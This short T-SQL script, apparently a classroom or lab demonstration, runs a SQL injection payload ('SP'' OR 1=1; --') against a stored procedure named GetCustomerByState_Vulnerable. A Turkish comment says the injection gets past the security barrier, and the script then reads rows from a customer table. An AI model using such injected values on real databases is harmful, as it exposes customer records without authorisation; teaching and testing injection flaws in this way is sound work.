USE DB_Performans;
GO

-- Sisteme OR 1=1 mantıksal hatası enjekte edilerek güvenlik duvarı aşılıyor.
EXEC GetCustomerByState_Vulnerable @State = 'SP'' OR 1=1; --';
GO

SELECT TOP 10 * FROM DB_Performans.dbo.Olist_Customers;